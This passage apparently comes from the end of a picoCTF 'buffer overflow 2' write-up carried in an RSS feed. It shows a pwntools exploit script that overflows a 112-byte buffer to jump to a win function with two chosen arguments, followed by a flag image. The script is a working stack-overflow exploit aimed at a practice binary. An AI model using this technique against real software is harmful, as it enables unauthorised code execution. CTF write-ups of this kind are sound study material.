</span></span><span style="display:flex;"><span>buffer_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> buffer_size <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>addr_win <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;win&#34;</span>])
</span></span><span style="display:flex;"><span>addr_main <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;main&#34;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>arg1 <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xCAFEF00D</span>)
</span></span><span style="display:flex;"><span>arg2 <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xF00DF00D</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload_list <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>        padding,
</span></span><span style="display:flex;"><span>        addr_win,
</span></span><span style="display:flex;"><span>        addr_main,
</span></span><span style="display:flex;"><span>        arg1,
</span></span><span style="display:flex;"><span>        arg2
</span></span><span style="display:flex;"><span>        ]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(payload_list)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p><img src="/img/pico/buff2/flag.png" alt="Pico flag"></p>
]]></description>
      
    </item>
    
    
  </channel>
</rss>
